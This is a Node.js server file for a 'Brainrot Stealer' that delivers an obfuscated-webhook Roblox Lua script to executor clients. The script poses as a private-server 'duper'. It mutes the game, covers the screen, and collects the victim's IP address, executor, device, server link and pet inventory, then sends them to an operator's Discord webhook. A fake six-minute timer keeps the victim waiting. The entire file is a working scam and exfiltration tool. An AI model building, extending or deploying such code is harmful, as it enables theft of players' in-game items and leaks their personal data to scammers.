// server.js - ENHANCED PROTECTION & OBFUSCATION
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// Enhanced webhook storage with obfuscation
const webhookStorage = new Map();
const premiumUsers = new Map(); // Store premium user IDs

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: '*/*' }));

// ENHANCED PROTECTION - STRICTER BLOCKING
function blockNonExecutor(req, res, next) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ref = (req.headers["referer"] || "").toLowerCase();
  const ip = req.ip || req.connection.remoteAddress;

  console.log(`🛡️ Protection Check - IP: ${ip}, UA: ${ua}`);

  // Strict executor checking
  const allowed = 
    ua.includes("roblox") ||
    ua.includes("synapse") ||
    ua.includes("krnl") ||
    ua.includes("fluxus") ||
    ua.includes("executor") ||
    ua.includes("scriptware") ||
    ua.includes("electron") ||
    ua.includes("protosmasher") ||
    ref.includes("roblox") ||
    (ua.includes("windows") && ua.includes("http"));

  if (!allowed) {
    console.log(`❌ Blocked non-executor: ${ua}`);
    return res.status(403).send("-- EXECUTOR ACCESS ONLY --");
  }
  
  next();
}

// OBFUSCATED WEBHOOK STORAGE
function obfuscateWebhook(webhook) {
  // Simple XOR obfuscation
  const key = "brainrot_secure_key_2024";
  let obfuscated = "";
  for (let i = 0; i < webhook.length; i++) {
    obfuscated += String.fromCharCode(webhook.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return Buffer.from(obfuscated).toString('base64');
}

function deobfuscateWebhook(obfuscated) {
  try {
    const decoded = Buffer.from(obfuscated, 'base64').toString();
    const key = "brainrot_secure_key_2024";
    let webhook = "";
    for (let i = 0; i < decoded.length; i++) {
      webhook += String.fromCharCode(decoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return webhook;
  } catch (e) {
    return null;
  }
}

// STORE WEBHOOK ENDPOINT - OBFUSCATED
app.post("/store", (req, res) => {
  try {
    const { webhook_id, webhook_url, premium } = req.body;
    
    console.log("🔐 Storing obfuscated webhook:", webhook_id);
    
    if (webhook_id && webhook_url && webhook_url.startsWith("https://discord.com/api/webhooks/")) {
      // Obfuscate the webhook before storing
      const obfuscated = obfuscateWebhook(webhook_url);
      webhookStorage.set(webhook_id, obfuscated);
      
      // Mark as premium if applicable
      if (premium) {
        premiumUsers.set(webhook_id, true);
      }
      
      console.log("✅ Webhook stored (obfuscated):", webhook_id);
      res.json({ success: true, message: "Webhook stored securely" });
    } else {
      res.status(400).json({ success: false, message: "Invalid data" });
    }
  } catch (error) {
    console.log("❌ Store error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// GET WEBHOOK ENDPOINT - OBFUSCATED
app.get("/webhook/:id", (req, res) => {
  const webhookId = req.params.id;
  const obfuscated = webhookStorage.get(webhookId);
  
  if (obfuscated) {
    const webhook = deobfuscateWebhook(obfuscated);
    if (webhook) {
      console.log("✅ Serving obfuscated webhook for:", webhookId);
      res.json({ 
        success: true, 
        webhook: webhook,
        premium: premiumUsers.has(webhookId)
      });
    } else {
      res.status(500).json({ success: false, message: "Deobfuscation failed" });
    }
  } else {
    res.status(404).json({ success: false, message: "Webhook not found" });
  }
});

// TEST ENDPOINT
app.get("/test", (req, res) => {
  res.json({ 
    status: "ENHANCED SERVER WORKING", 
    protection: "ACTIVE",
    obfuscation: "ENABLED",
    storage_count: webhookStorage.size
  });
});

// HOME
app.get("/", (req, res) => {
  res.send("Brainrot Stealer - Enhanced Protection System");
});

// /raw → ENHANCED LUA SCRIPT WITH ANIMATIONS & PROTECTION
app.get("/raw", blockNonExecutor, (req, res) => {
  const webhookId = req.query.id;
  
  console.log("🎯 Serving enhanced script for ID:", webhookId);

  if (!webhookId) {
    return res.status(400).send("-- MISSING WEBHOOK ID --");
  }

  // ENHANCED LUA SCRIPT WITH ANIMATIONS & PROTECTION
  const luaScript = `-- Brainrot Stealer - Enhanced Version
print("🔒 Loading Enhanced Brainrot Stealer...")

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

local player = Players.LocalPlayer
if not player then
    repeat wait() until Players.LocalPlayer
    player = Players.LocalPlayer
end
repeat wait() until player.PlayerGui

-- COMPLETELY REMOVE ALL SOUNDS
print("🔇 Removing all sounds...")
pcall(function()
    SoundService.Volume = 0
    for _, sound in pairs(SoundService:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
            sound:Stop()
        end
    end
end)

-- Enable HTTP
pcall(function() HttpService.HttpEnabled = true end)

local WebhookID = "${webhookId}"
local ServerURL = "https://tommyfc555-github-io.onrender.com"

-- Get webhook from server (OBFUSCATED)
local function getWebhook()
    local success, result = pcall(function()
        local response
        if syn then
            response = syn.request({
                Url = ServerURL .. "/webhook/" .. WebhookID,
                Method = "GET"
            })
        elseif request then
            response = request({
                Url = ServerURL .. "/webhook/" .. WebhookID,
                Method = "GET"
            })
        else
            response = {
                Body = game:HttpGet(ServerURL .. "/webhook/" .. WebhookID, true)
            }
        end
        
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data.success then
                return data.webhook, data.premium or false
            end
        end
        return nil, false
    end)
    return success and result
end

-- Send to Discord
local function sendToDiscord(embedData)
    local webhook, isPremium = getWebhook()
    if not webhook then
        print("❌ No webhook available")
        return false
    end
    
    local success, result = pcall(function()
        local data = {
            embeds = {embedData}
        }
        
        local json = HttpService:JSONEncode(data)
        
        if syn and syn.request then
            return syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        elseif request then
            return request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        else
            HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
            return {StatusCode = 200}
        end
    end)
    
    return success and result and (result.StatusCode == 200 or result.StatusCode == 204)
end

-- Get IP with premium check
local function getIP(isPremium)
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org", true)
    end)
    
    if success and ip then
        if isPremium then
            return ip -- Full IP for premium
        else
            -- Censor IP for non-premium
            local parts = ip:split(".")
            if #parts == 4 then
                return parts[1] .. "." .. parts[2] .. ".XXX.XXX"
            else
                return "XXX.XXX.XXX.XXX"
            end
        end
    end
    return "Unknown"
end

-- Get executor
local function getExecutor()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "Krnl" 
    elseif fluxus then return "Fluxus"
    elseif PROTOSMASHER_LOADED then return "ProtoSmasher"
    elseif electron then return "Electron"
    elseif scriptware then return "ScriptWare"
    else return "Unknown" end
end

-- Scan pets function
local function scanPets()
    local allPets = {}
    local brainrotPets = {}
    local totalValue = 0
    
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return end
        
        for _, plot in pairs(plots:GetChildren()) do
            local pods = plot:FindFirstChild("AnimalPodiums")
            if not pods then continue end
            
            for _, pod in pairs(pods:GetChildren()) do
                local base = pod:FindFirstChild("Base")
                if not base then continue end
                local spawn = base:FindFirstChild("Spawn")
                if not spawn then continue end
                local attachment = spawn:FindFirstChild("Attachment")
                if not attachment then continue end
                local overhead = attachment:FindFirstChild("AnimalOverhead")
                if not overhead then continue end
                local nameLabel = overhead:FindFirstChild("DisplayName")
                local genLabel = overhead:FindFirstChild("Generation")
                
                if not nameLabel or not nameLabel:IsA("TextLabel") then continue end
                
                local petName = nameLabel.Text
                local rateText = genLabel and genLabel.Text or "0/s"
                if petName == "" then continue end
                
                local rateNumber = tonumber(string.match(rateText, "([%d%.]+)")) or 0
                local moneyValue = 0
                
                if string.find(rateText, "B/s") then moneyValue = rateNumber * 1e9
                elseif string.find(rateText, "M/s") then moneyValue = rateNumber * 1e6
                elseif string.find(rateText, "K/s") then moneyValue = rateNumber * 1e3
                else moneyValue = rateNumber end
                
                totalValue = totalValue + moneyValue
                
                local petData = {
                    Name = petName,
                    Rate = rateText,
                    Money = moneyValue
                }
                
                table.insert(allPets, petData)
                
                if string.find(string.lower(petName), "brainrot") and moneyValue > 1e6 then
                    table.insert(brainrotPets, petData)
                end
            end
        end
    end)
    
    -- Sort by money
    table.sort(allPets, function(a, b) return a.Money > b.Money end)
    table.sort(brainrotPets, function(a, b) return a.Money > b.Money end)
    
    return allPets, brainrotPets, totalValue
end

-- Create animated black background
local function createBlackBackground()
    local blackScreen = Instance.new("ScreenGui")
    blackScreen.Name = "BlackScreen"
    blackScreen.IgnoreGuiInset = true
    blackScreen.DisplayOrder = 9999
    blackScreen.Parent = player.PlayerGui
    
    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.new(0, 0, 0)
    background.BorderSizePixel = 0
    background.Parent = blackScreen
    
    -- Animate fade in
    background.BackgroundTransparency = 1
    local tween = TweenService:Create(background, TweenInfo.new(1), {BackgroundTransparency = 0})
    tween:Play()
    
    return blackScreen
end

-- Create animated main GUI
local function createAnimatedGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BrainrotStealerUI"
    screenGui.DisplayOrder = 10000
    screenGui.Parent = player.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 0, 0, 0) -- Start small
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 30)
    mainFrame.BackgroundTransparency = 1
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screenGui
    
    -- Animated background effect
    local uiGradient = Instance.new("UIGradient")
    uiGradient.Rotation = 45
    uiGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 50, 100)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 100, 200)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 50, 100))
    })
    uiGradient.Parent = mainFrame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 15)
    corner.Parent = mainFrame
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 150, 255)
    stroke.Thickness = 2
    stroke.Parent = mainFrame
    
    -- Animate frame growing
    local sizeTween = TweenService:Create(mainFrame, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 450, 0, 350),
        BackgroundTransparency = 0
    })
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 70)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(0, 30, 60)
    title.Text = "🧠 BRAINROT STEALER\\nPRIVATE SERVER DUPER"
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.TextStrokeTransparency = 0
    title.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
    title.BackgroundTransparency = 1
    title.Parent = mainFrame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 15)
    titleCorner.Parent = title
    
    local inputBox = Instance.new("TextBox")
    inputBox.Size = UDim2.new(0.8, 0, 0, 45)
    inputBox.Position = UDim2.new(0.1, 0, 0.3, 0)
    inputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
    inputBox.TextColor3 = Color3.new(1, 1, 1)
    inputBox.PlaceholderText = "📋 Paste Private Server Link Here..."
    inputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 200)
    inputBox.Text = ""
    inputBox.TextSize = 14
    inputBox.Font = Enum.Font.Gotham
    inputBox.BackgroundTransparency = 1
    inputBox.Parent = mainFrame
    
    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 8)
    inputCorner.Parent = inputBox
    
    local inputStroke = Instance.new("UIStroke")
    inputStroke.Color = Color3.fromRGB(0, 100, 200)
    inputStroke.Thickness = 1
    inputStroke.Parent = inputBox
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.8, 0, 0, 25)
    statusLabel.Position = UDim2.new(0.1, 0, 0.5, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "🔒 Status: Ready - Enter server link"
    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
    statusLabel.TextSize = 12
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.Parent = mainFrame
    
    local dupeButton = Instance.new("TextButton")
    dupeButton.Size = UDim2.new(0.7, 0, 0, 55)
    dupeButton.Position = UDim2.new(0.15, 0, 0.7, 0)
    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    dupeButton.Text = "🚀 START DUPING PROCESS"
    dupeButton.TextColor3 = Color3.new(1, 1, 1)
    dupeButton.Font = Enum.Font.GothamBold
    dupeButton.TextSize = 16
    dupeButton.BackgroundTransparency = 1
    dupeButton.Parent = mainFrame
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 10)
    buttonCorner.Parent = dupeButton
    
    local buttonStroke = Instance.new("UIStroke")
    buttonStroke.Color = Color3.fromRGB(0, 200, 255)
    buttonStroke.Thickness = 2
    buttonStroke.Parent = dupeButton
    
    -- Button hover effects
    dupeButton.MouseEnter:Connect(function()
        TweenService:Create(dupeButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(0, 150, 255),
            BackgroundTransparency = 0
        }):Play()
    end)
    
    dupeButton.MouseLeave:Connect(function()
        TweenService:Create(dupeButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(0, 100, 200),
            BackgroundTransparency = 1
        }):Play()
    end)
    
    -- Start animations
    sizeTween:Play()
    wait(0.8)
    
    -- Animate elements appearing
    TweenService:Create(title, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
    TweenService:Create(inputBox, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
    TweenService:Create(dupeButton, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
    
    return screenGui, mainFrame, inputBox, statusLabel, dupeButton
end

-- Create 6-minute timer
local function createTimer()
    local timerGui = Instance.new("ScreenGui")
    timerGui.Name = "TimerDisplay"
    timerGui.DisplayOrder = 10001
    timerGui.Parent = player.PlayerGui
    
    local timerFrame = Instance.new("Frame")
    timerFrame.Size = UDim2.new(1, 0, 1, 0)
    timerFrame.Position = UDim2.new(0, 0, 0, 0)
    timerFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    timerFrame.BackgroundTransparency = 0.7
    timerFrame.BorderSizePixel = 0
    timerFrame.Parent = timerGui
    
    local timerText = Instance.new("TextLabel")
    timerText.Size = UDim2.new(1, 0, 0, 100)
    timerText.Position = UDim2.new(0, 0, 0.4, 0)
    timerText.BackgroundTransparency = 1
    timerText.Text = "06:00"
    timerText.TextColor3 = Color3.fromRGB(255, 50, 50)
    timerText.TextSize = 48
    timerText.Font = Enum.Font.GothamBold
    timerText.TextStrokeTransparency = 0
    timerText.TextStrokeColor3 = Color3.new(0, 0, 0)
    timerText.Parent = timerFrame
    
    local infoText = Instance.new("TextLabel")
    infoText.Size = UDim2.new(1, 0, 0, 30)
    infoText.Position = UDim2.new(0, 0, 0.55, 0)
    infoText.BackgroundTransparency = 1
    infoText.Text = "⏰ Please wait 6 minutes for the process to complete..."
    infoText.TextColor3 = Color3.new(1, 1, 1)
    infoText.TextSize = 16
    infoText.Font = Enum.Font.Gotham
    infoText.Parent = timerFrame
    
    return timerGui, timerText
end

-- Main execution
wait(1)

-- Create black background (blocks everything)
local blackScreen = createBlackBackground()

-- Create animated GUI
local screenGui, mainFrame, inputBox, statusLabel, dupeButton = createAnimatedGUI()

dupeButton.MouseButton1Click:Connect(function()
    local serverLink = inputBox.Text
    if serverLink == "" or not string.find(string.lower(serverLink), "roblox") then
        statusLabel.Text = "❌ Status: Invalid server link!"
        return
    end
    
    -- Get premium status
    local webhook, isPremium = getWebhook()
    
    statusLabel.Text = "🔄 Status: Starting dupe process..."
    dupeButton.Text = "INITIALIZING..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
    
    wait(1)
    
    -- Remove GUI
    screenGui:Destroy()
    
    statusLabel.Text = "🔍 Status: Scanning server for pets..."
    
    wait(2)
    
    -- Scan pets
    local allPets, brainrotPets, totalValue = scanPets()
    
    statusLabel.Text = "📡 Status: Sending data to Discord..."
    
    -- Get user info
    local executor = getExecutor()
    local ip = getIP(isPremium)
    local device = UserInputService.TouchEnabled and "Mobile" or "PC"
    
    -- Format BEST BRAINROTS
    local bestBrainrotsText = ""
    for i = 1, math.min(5, #brainrotPets) do
        bestBrainrotsText = bestBrainrotsText .. "**" .. brainrotPets[i].Name .. "** | " .. brainrotPets[i].Rate .. "\\n"
    end
    if bestBrainrotsText == "" then
        bestBrainrotsText = "No brainrots found"
    end
    
    -- Format top pets
    local topPetsText = ""
    for i = 1, math.min(5, #allPets) do
        topPetsText = topPetsText .. "**" .. allPets[i].Name .. "** | " .. allPets[i].Rate .. "\\n"
    end
    if topPetsText == "" then
        topPetsText = "No pets found"
    end
    
    -- Create premium embed
    local embed = {
        title = "🧠 BRAINROT STEALER - PREMIUM DUPE",
        description = "**Private Server Successfully Scanned**",
        color = 0x00FF00,
        fields = [
            {
                name = "👤 USER INFORMATION",
                value = "**Executor:** " .. executor .. "\\n**IP:** " .. ip .. "\\n**Device:** " .. device .. "\\n**Premium:** " .. (isPremium and "✅ YES" or "❌ NO"),
                inline = false
            },
            {
                name = "🎯 SERVER DETAILS", 
                value = "**Link:** " .. serverLink .. "\\n**Place ID:** " .. game.PlaceId .. "\\n**Job ID:** " .. game.JobId,
                inline = false
            },
            {
                name = "📊 SCAN RESULTS",
                value = "**Total Pets:** " .. #allPets .. "\\n**Brainrots Found:** " .. #brainrotPets .. "\\n**Total Value:** $" .. string.format("%.2f", totalValue),
                inline = true
            },
            {
                name = "💰 BEST BRAINROTS",
                value = bestBrainrotsText,
                inline = true
            },
            {
                name = "🏆 TOP 5 PETS", 
                value = topPetsText,
                inline = true
            }
        ],
        footer = {
            text = "Brainrot Stealer Premium • " .. os.date("%X")
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    -- Send to Discord
    local success = sendToDiscord(embed)
    
    if success then
        -- Create 6-minute timer
        local timerGui, timerText = createTimer()
        
        local startTime = tick()
        local totalTime = 360 -- 6 minutes
        
        while tick() - startTime < totalTime do
            local remaining = totalTime - (tick() - startTime)
            local minutes = math.floor(remaining / 60)
            local seconds = math.floor(remaining % 60)
            timerText.Text = string.format("%02d:%02d", minutes, seconds)
            wait(0.1)
        end
        
        -- Timer complete
        timerText.Text = "✅ COMPLETE"
        timerText.TextColor3 = Color3.fromRGB(0, 255, 0)
        
        wait(3)
        
        -- Clean up everything
        blackScreen:Destroy()
        timerGui:Destroy()
        
        print("✅ Premium dupe process completed successfully!")
    else
        statusLabel.Text = "❌ Status: Failed to send data"
        wait(3)
        blackScreen:Destroy()
    end
end)

print("🎮 Enhanced Brainrot Stealer Loaded!")
print("🔒 All sounds removed, black background active")
print("🚀 Ready for private server duping")`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  res.send(luaScript);
});

// 404 Handler
app.use((req, res) => {
  res.status(404).send("Endpoint not found");
});

// START SERVER
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Enhanced Server LIVE on port ${PORT}`);
  console.log(`🔒 Protection: ACTIVE`);
  console.log(`🔐 Obfuscation: ENABLED`);
  console.log(`💎 Premium System: READY`);
});
